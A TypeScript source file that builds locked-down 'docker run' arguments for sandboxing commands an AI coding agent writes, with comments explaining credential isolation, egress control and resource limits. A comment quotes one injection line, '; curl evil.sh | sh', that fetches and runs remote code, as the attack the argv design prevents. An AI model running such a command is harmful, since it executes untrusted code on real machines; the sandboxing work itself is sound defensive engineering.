/**
 * Runs agent-authored commands inside a container instead of on the runner VM.
 *
 * The division of labour matters more than any individual flag. The *driver*
 * stays on the host: it holds the task token and the clone token, and it does
 * the clone, the commit, the push and the PR. The *agent* gets a container with
 * the worktree bind-mounted and nothing else — no tokens, no `~/.gitconfig`, no
 * GitHub Actions environment, no network. Git operations are therefore mediated
 * outside the sandbox with scoped credentials, which is what stops "the agent
 * can run arbitrary bash" from meaning "the agent can push anywhere the runner
 * can".
 *
 * This is the boundary that regex command-classification cannot be. The
 * classifier stays as defence in depth — it refuses obviously destructive
 * commands early, with a better error than a container failure — but the thing
 * that actually holds is that the process has no credential to steal and no
 * socket to send it over.
 */

export interface ContainerSandboxConfig {
  /**
   * Immutable base image, pinned by digest.
   *
   * A tag is mutable: `node:20` today and `node:20` next month are different
   * images, so a run is not reproducible and a compromised tag is a supply
   * chain problem nobody would notice. A digest cannot be moved.
   */
  image: string;
  /** Host path of the task worktree. The only thing mounted. */
  worktreeHostPath: string;
  /** Where it appears inside the container. */
  workdir?: string;
  /**
   * Egress. `none` is the default and the safe one: a build that needs
   * dependencies should have had them fetched by the driver, outside the
   * sandbox, before the agent ran — which is what a Cloud Code environment's
   * setup script is for.
   *
   * `full` exists because that argument does not cover everything. A run that
   * has to install a package the model discovers it needs mid-task cannot have
   * fetched it beforehand, and the honest options are "let the container out"
   * or "do not offer the capability". It is never a default: a caller reaches
   * it only when a person chose it for that run, and at that level an agent
   * that can run `curl` can post the worktree anywhere.
   */
  network?: "none" | "proxied" | "full";
  /** Docker network name for the capability-aware egress proxy, when proxied. */
  proxyNetwork?: string;
  /**
   * Names — never values — of environment variables to carry into the
   * container from the environment the caller spawns `docker` with.
   *
   * This is how a Cloud Code environment's variables reach a build without
   * putting a secret in an argv. `docker run --env NAME` with no `=` forwards
   * the value from the docker CLI's own process environment, and that
   * environment is the scrubbed map the driver already builds for agent
   * children (`ToolContext.env`), so the only thing that can cross is
   * something the caller deliberately put there. See the `--env` note below.
   */
  forwardEnv?: string[];
  memory?: string;
  cpus?: string;
  pidsLimit?: number;
  /** Writable scratch inside the container, since the root filesystem is not. */
  tmpfsSizeMB?: number;
}

export const DEFAULT_CONTAINER_LIMITS = {
  memory: "2g",
  cpus: "2",
  pidsLimit: 512,
  tmpfsSizeMB: 512,
} as const;

/**
 * Builds the `docker run` argv for one command.
 *
 * Returned as an argv array, never as a shell string: the command is
 * agent-authored, and interpolating it into a shell line to be re-parsed is
 * how `; curl evil.sh | sh` becomes a second command. Here it is a single
 * argument to the container's own shell, which is the only thing that parses
 * it.
 */
export function buildContainerArgs(
  command: string,
  config: ContainerSandboxConfig
): string[] {
  const workdir = config.workdir ?? "/work";
  const limits = { ...DEFAULT_CONTAINER_LIMITS };

  const args = [
    "run",
    "--rm",
    // No stdin: nothing interactive can be waiting for input that never comes.
    "--interactive=false",
    // Drop every capability, then add nothing back. A build does not need to
    // change ownership, load modules or mount filesystems.
    "--cap-drop=ALL",
    // Stops a process gaining privileges through a setuid binary it wrote.
    "--security-opt=no-new-privileges",
    // The image is immutable at runtime too: only the worktree and the tmpfs
    // below are writable, so a command cannot leave anything behind in the
    // image layer for a later run to pick up.
    "--read-only",
    `--tmpfs=/tmp:rw,noexec,nosuid,size=${config.tmpfsSizeMB ?? limits.tmpfsSizeMB}m`,
    `--memory=${config.memory ?? limits.memory}`,
    // Without this a memory limit is advisory: the kernel swaps instead of
    // killing, and a runaway build takes the host down slowly rather than
    // failing fast.
    `--memory-swap=${config.memory ?? limits.memory}`,
    `--cpus=${config.cpus ?? limits.cpus}`,
    // The fork-bomb bound. Container memory limits alone do not stop one.
    `--pids-limit=${config.pidsLimit ?? limits.pidsLimit}`,
  ];

  if (config.network === "proxied" && config.proxyNetwork) {
    // A dedicated docker network whose only route out is the egress proxy, so
    // "allowed domains" is enforced by something the container cannot
    // reconfigure — rather than by an environment variable it could unset.
    args.push(`--network=${config.proxyNetwork}`);
  } else if (config.network === "full") {
    // Docker's default bridge: whatever the host can reach. Named explicitly
    // rather than by omitting the flag, so a reader of this argv can tell a
    // deliberate choice from a forgotten one.
    args.push("--network=bridge");
  } else {
    args.push("--network=none");
  }

  // The only mount. Not the home directory, not the docker socket, not the
  // runner's checkout — any of which would hand back everything the container
  // exists to withhold.
  args.push(`--volume=${config.worktreeHostPath}:${workdir}`);
  args.push(`--workdir=${workdir}`);

  /*
   * No `--env-file`, and no `--env NAME=VALUE`.
   *
   * The boundary has always been that the container starts with the image's
   * environment and nothing of the host's — because a bulk forward hands the
   * agent the task token, the clone token and the Actions OIDC variables. That
   * is still the boundary. What crosses here is a list of NAMES the caller
   * asked for, one `--env NAME` each, which makes docker copy the value from
   * its own process environment: the scrubbed map the driver builds for agent
   * children, which holds no Juno credential by construction.
   *
   * Two consequences worth being explicit about. Nothing derived from the
   * host's real environment can arrive by accident, because the caller has to
   * name it twice — once in the env it spawns docker with, once here. And no
   * value ever appears in an argv, so a secret cannot be read out of the
   * process list.
   *
   * Names are filtered to the POSIX shape. A name is interpolated into an
   * argument, and one containing `=` would turn `--env NAME` into the
   * value-carrying form this comment just ruled out.
   */
  for (const name of config.forwardEnv ?? []) {
    if (/^[A-Za-z_][A-Za-z0-9_]*$/.test(name)) args.push("--env", name);
  }

  args.push(config.image, "/bin/bash", "-c", command);
  return args;
}

/** Reads the sandbox configuration from the driver's environment. */
export function containerSandboxFromEnv(
  env: NodeJS.ProcessEnv,
  worktreeHostPath: string
): ContainerSandboxConfig | null {
  const image = env.JUNO_RUNNER_SANDBOX_IMAGE?.trim();
  if (!image) return null;
  const network = env.JUNO_RUNNER_SANDBOX_NETWORK?.trim();
  return {
    image,
    worktreeHostPath,
    // Anything unrecognised is `none`. A typo in a deployment variable must not
    // be the thing that opens egress.
    network: network === "proxied" ? "proxied" : network === "full" ? "full" : "none",
    proxyNetwork: env.JUNO_RUNNER_SANDBOX_PROXY_NETWORK?.trim() || undefined,
    memory: env.JUNO_RUNNER_SANDBOX_MEMORY?.trim() || undefined,
    cpus: env.JUNO_RUNNER_SANDBOX_CPUS?.trim() || undefined,
  };
}

/**
 * True when the image is pinned to a digest rather than a tag.
 *
 * Not enforced here — a deployment may knowingly run a tag while iterating —
 * but reported, so the audit trail records which of the two a run used.
 */
export function isImmutableImage(image: string): boolean {
  return /@sha256:[0-9a-f]{64}$/.test(image);
}
